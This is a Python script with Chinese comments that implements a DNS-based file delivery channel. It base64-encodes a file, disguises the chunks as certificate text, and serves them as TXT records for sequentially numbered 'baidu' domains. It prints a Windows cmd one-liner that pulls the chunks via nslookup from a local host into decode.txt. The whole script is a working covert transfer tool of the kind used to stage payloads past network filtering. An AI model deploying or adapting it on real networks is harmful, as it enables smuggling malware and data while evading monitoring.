import base64
import sys
import re
from dnslib import *
from socketserver import UDPServer, BaseRequestHandler

# 读取文件内容，转换为base64编码
with open(sys.argv[1], 'rb') as f:
    content = f.read()
    base64_content = base64.b64encode(content).decode('utf-8')

# 将base64编码的字符串分割成32000长度的列表
L = [base64_content[i:i+32000] for i in range(0, len(base64_content), 32000)]

# 将L列表中的元素再次分割成长度不超过190，每个元素长度为250的列表
for i in range(len(L)):
    temp = [L[i][j:j+250] for j in range(0, len(L[i]), 250)]
    temp = ['exec' + s for s in temp]
    L[i] = temp
    if i == 0:
        L[i].insert(0, "exec-----BEGIN CERTIFICATE-----")
    if i == len(L)-1:
        L[i].append("exec-----END CERTIFICATE-----")

# 打印L列表

# for i, l in enumerate(L):
#     print(f"l{i+1} = {l}")
class DNSHandler(BaseRequestHandler):
    def handle(self):
        data = self.request[0].strip()
        sock = self.request[1]
        request = DNSRecord.parse(data)

        # 获取请求的域名
        domain = str(request.q.qname)

        match = re.match(r"baidu(\d+)\.com", domain)
        if match:
            number = int(match.group(1))
        # 如果请求的是 baidu.com，则返回 TXT 记录
        
        # if domain == f'baidu{i}.com.' and
        try: 
            if request.q.qtype == QTYPE.TXT:
                reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(L[number])))
                sock.sendto(reply.pack(), self.client_address)
                print(f"Send {number+1}rd TXT Record Success")
        except IndexError:
            print("Done, Press Ctrl + C to Exit")
            # break
        # 如果请求的不是 baidu.com 或不是 TXT 记录，则返回 NXDOMAIN
        # else:
        #     reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1, rcode=NXDOMAIN), q=request.q)
        #     sock.sendto(reply.pack(), self.client_address)

# 创建 DNS 服务器并监听 53 端口
server = UDPServer(('0.0.0.0', 53), DNSHandler)
print('DNS server started on port 53')
print(f"""
==========
Please Change Your DNS Server IP:

cmd /v:on /Q /c "for /l %i in (0,1,{len(L)}) do (set a= && set b= && for /f "tokens=*" %j in ('nslookup -qt^=TXT baidu%i.com 192.168.2.3 ^| findstr "exec"') do (set a=%j && echo !a:~5,-2! >> decode.txt))"

=========
""")
server.serve_forever()



